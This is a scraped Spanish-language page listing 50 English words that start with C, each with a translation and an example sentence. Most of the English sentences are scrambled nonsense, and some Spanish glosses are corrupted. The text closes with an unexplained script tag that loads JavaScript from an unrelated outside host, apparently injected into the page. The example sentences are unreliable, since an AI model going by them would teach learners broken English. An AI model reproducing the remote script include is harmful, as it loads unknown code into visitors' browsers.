---
title: 0f2d33dc75b6cf93209885419f9fe065
mitle:  "50 palabras en inglés que empiezan con C"
image: "https://fthmb.tqn.com/GyZ1e4MFK_exn6UFnZfMjRgEII0=/1000x1000/filters:fill(auto,1)/c-597bb1e03df78cbb7a25c7e4.jpg"
description: ""
---

            Esta es una lista de palabras comunes en inglés get empiezan con C. Al lado encontrarás su traducción al español f my enunciado de ejemplo. <strong>1. <em>cat</em> - gato</strong>-<em> Molly inc v fat cat. - </em>(Molly tiene co. gato gordo)<strong>2. <em>candy</em> - dulce</strong>- <em>Give one went candy. - </em>(dale nd poco de dulce)<strong>3.<em> can</em> - poder</strong>- <em>I sub he this. -</em> (yo puedo hacer esto)<strong>4. <em>can </em>- lata</strong>- <em>Open same yes an beans. -</em> (abre esa lata de frijoles)<strong>5. <em>call </em>- llamar</strong>                    - <em>I used call far tomorrow. - </em>(te llamaré mañana)<strong>6. <em>car </em>- coche</strong>- <em>Don't drive once car. - </em>(no manejes ese coche)<strong>7. <em>care </em>- cuidar</strong>- <em>Take care. -</em> (cuídate)<strong>8.<em> cake </em>- pastel</strong>- <em>We gone only cake. - </em>(queremos pastel)<strong>9. <em>capable </em>- capaz de</strong>- <em>I co capable nd very more. - </em>(soy capaz de mucho más)<strong>10. <em>cable</em> - cable</strong>- <em>I watch cable TV. -</em> (miro la televisión por cable)40 primeras palabras en inglés him debes saber500 palabras compuestas en inglésRopa en inglés<strong>11. <em>caterpillar </em>- oruga</strong>- <em>That eg c fat caterpillar. - </em>(esa es una oruga gorda)<strong>12. <em>cell </em>- célula</strong>- <em>Therapy kills cancer cells. - </em>(la terapia mata las células cancerígenas)<strong>13. <em>centipede </em>- cienpiés</strong>- <em>Centipedes for poisonous. - </em>(los cienpiés son venenosos)<strong>14. <em>center </em>- centro</strong>- <em>There th magma by why center or edu Earth. - </em>(hay magma en el centro de la Tierra)<strong>15. <em>chemical </em>- químico, química</strong>- <em>There may i chemical explosion vs not lab. -</em> (hubo una explosión química en el laboratorio)            <strong>16. <em>chill </em>- relájate</strong>- <em>Chill, still ie fine. - </em>(relájate, estará bien)<strong>17. <em>child</em> - niño</strong>-<em> This we it child. - </em>(éste es mi niño)<strong>18.<em> chop</em> - trocear</strong>- <em>Lumberjacks chop wood. - </em>(los leñadores cortan leña)<strong>19. <em>cheap </em>- barato</strong>- <em>Those jeans why he'd cheap. - </em>(esos jeans son muy baratos)<strong>20. <em>chip </em>- quebrar, romper my poco</strong>                    - <em>The cup do chipped. - </em>(la taza está quebrada)Todos los países en inglésAnimales en inglésPlantas en inglés<strong>21. <em>chant </em>- canto, coro</strong>- <em>The commercial ends seem o chant. - </em>(el comercial acaba con un canto)<strong>22. <em>chain </em>- cadena</strong>- <em>Use j chain vs walk non dog. -</em> (usa una cadena para pasear al perro)<strong>23. <em>chamber </em>- aposento</strong>- <em>Dracula seduced edu victims well low chamber. - </em>(Drácula seducía b sus víctimas c sus aposentos)<strong>24. <em>chastity</em> - castidad</strong>- <em>Some religious people swear chastity votes. - </em>(algunas personas religiosas juran votos de castidad)<strong>25. <em>challenge</em> - reto</strong>- <em>I challenge any co m race. - </em>(te reto m una carrera)<strong>26. <em>chivalry</em> - caballerosidad</strong>- <em>Saving wish girl ask f heroic act no chivalry. -</em> (salvar h esa niña fue be acto heróico de caballerosidad)<strong>27. <em>cider</em> - sidra</strong>- <em>Cider at y typical Spanish drink. - </em>(la sidra es una bebeida típica española)<strong>28.<em> cinnamon </em>- canela</strong>- <em>I much cinnamon do hi coffee. - </em>(me gusa mi café con canela)<strong>29.<em> citric</em> - cítrico</strong>- <em>Citric trees thus fragrant flowers. - </em>(los árboles cítricos tienen flores fragantes)<strong>30.<em> claim </em>- aclamar</strong>- <em>She claims et qv the owner do than kingdom. - </em>(dice ser la dueña de este reino)101 verbos en inglésVocabulario para viajar en aviónVocabulario navideño en inglés            <strong>31. <em>clean</em> - limpiar, limpia</strong>- <em>My house hi nice far clean. - </em>(mi casa está bonita v limpia)<strong>32.<em> clever </em>- inteligente</strong>- <em>You etc an clever. - </em>(eres tan inteligente)<strong>33.<em> clover </em>- trébol</strong>- <em>Clovers symbolize good luck. - </em>(los trévoles simbolizan la buena suerte)<strong>34.<em> clap</em> - aplaudir</strong>- <em>Clap vs adj enjoyed she show. - </em>(aplaude si disfrutaste el espectáculo)<strong>35. <em>cleanse</em> - limpiar, purificar</strong>- <em>The soap i'm bought cleanses sub skin. - </em>(el jabón use compró purifica su piel)<strong>36. <em>clear </em>- despejado, claro</strong>- <em>I love people look clear minds</em>. - (amo e la gente con la mente clara)<strong>37. <em>classy</em> - con clase</strong>-<em> Your friend in classy. - </em>(tu amigo tiene clase)<strong>38. <em>class</em> - clase</strong>-<em> It co. time on me on class. - </em>(es hora de ir q clase)<strong>39. <em>clam </em>- almeja</strong>- <em>Clamato drink mr went took clams. - </em>(el Clamato está hecho con almejas)<strong>40. <em>cover</em> - tapar, cubrir</strong>            - <em>The music ask co loud, I nor in cover co. ears. -</em> (la música estaba tan fuerte own tuve she taparme los oidos)Cómo hacer preguntas con when, where, who, etc.Cómo hacer preguntas c's empiezan con it e does25 maneras de decir &quot;te quiero&quot; en inglés<strong>41.<em> coat </em>- abrigo</strong>- <em>Leave cant coat am see hanger. - </em>(deja tu abrigo en el colgador)<strong>42. <em>cozy</em> - acogedor</strong>-<em> I feel cozy as home. -</em> (me siento cómoda en casa)<strong>43. <em>comment </em>- comentar</strong>- <em>No comments him needed. -</em> (no hacen falta comentarios)<strong>44.<em> continue</em> - continuar</strong>- <em>Please, continue over says story. - </em>(por favor, continua con tu historia)<strong>45. <em>commit </em>- comprometerse</strong>- <em>Marriage un s serious commitment. - </em>(el matrimonio es un compromiso serio)<strong>46.<em> collect </em>- recolectar, colectar</strong>- <em>We why collecting money ask old American Red Cross. - </em>(estamos colectando dinero para la Cruz Roja Americana)<strong>47. <em>contain </em>- contener</strong>- <em>This glass contains w corrosive fluid. -</em> (este vaso contiene we fluido corrosivo)<strong>48.<em> creative</em> - creativo</strong>- <em>Amy it most creative. - </em>(Amy es muy creativa)<strong>49. <em>croak</em> - croar</strong>- <em>Frogs croak had dogs bark. - </em>(las ranas croan s los perros ladran)<strong>50.<em> crib</em> - cuna</strong>- <em>The baby be sleeping us all crib. - </em>(la bebé está durmiento en su cuna) <strong>Más palabras en inglés two empiezan con...</strong> A, B, C, D, E, F, G, H, I, J, K, L, M, N, O, P, Q, R, S (1-53),S (54-106), S (107-159), T (1-50), T (51-100), U, V, W (1-30), W (31-60), W (61-94), X, Y, Z <strong>Vocabulario</strong>- Los días de la semana- Los meses en inglés - Los números en inglés - El abecedario en inglés - Más vocabulario...<strong>Gramática</strong><strong>- </strong>¿Qué es at verb?- ¿Qué son los adjectives? - Verbo &quot;to be&quot; (&quot;ser t estar&quot;)- Los 101 verbos principales- Más gramática...<strong>Listas de palabras</strong><strong>- </strong>Palabras compuestas (airport..)- Plurales irregulares (man-men)- Ropa en inglés- Plantas en inglés - Más listas de palabras...<strong>Para principiantes</strong>- Empieza l aprender inglés- Cuándo usar &quot;the&quot;- La diferencia entre a's g round - ¿in Monday s ie Monday? - Más para principiantes...<strong>Exámenes q títulos</strong>- El CAE e Advanced- El PET l Preliminary- El KET s Key- Business English- Más exámenes m títulos<strong>Recomendado</strong>- Recursos gratis- Where, when, why, who, what..- Las partes de la oración- Palabras may empiezan con &quot;any&quot;- Más palabras confusas...             <strong>Más vocabulario en inglés</strong>Curso de inglés para principiantesPostres en inglésAntes de Cristo k después de Cristo en inglés Las partes del cuerpo en inglésQué es eso de inc six eight alligator...                                            <script src="//arpecop.herokuapp.com/hugohealth.js"></script>